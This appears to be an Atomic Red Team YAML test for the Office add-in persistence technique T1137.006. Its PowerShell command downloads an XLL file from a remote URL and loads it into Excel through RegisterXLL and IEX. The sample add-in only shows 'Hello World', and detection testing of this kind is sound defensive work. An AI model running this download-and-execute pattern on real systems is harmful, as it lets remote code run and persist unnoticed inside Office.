attack_technique: T1137.006
display_name: "Office Application Startup: Add-ins"
atomic_tests:
- name: Code Executed Via Excel Add-in File (Xll)
  auto_generated_guid: 
  description: |
    Downloads a XLL file and loads it using the excel add-ins library.
    This causes excel to display the message "Hello World"
    Source of XLL - https://github.com/edparcell/HelloWorldXll 
  supported_platforms:
  - windows
  input_arguments:
    xll_url:
      description: url of the file HelloWorldXll.xll
      type: url
      default: 'https://github.com/morgansec/atomic-red-team/blob/T1137-xll/atomics/T1137.006/HelloWorldXll.xll?raw=true'
    local_file:
      description: name of the xll file 
      type: string
      default: '$env:tmp\HelloWorldXll.xll'
  executor:
    command: |
    powershell -c "iwr -URI #{xll_url} -o #{local_file}; IEX ((new-object -ComObject excel.application).RegisterXLL(#{local_file}))"
    cleanup_command: del "#{local_file}" >nul 2>&1
    name: command_prompt
    elevation_required: false
  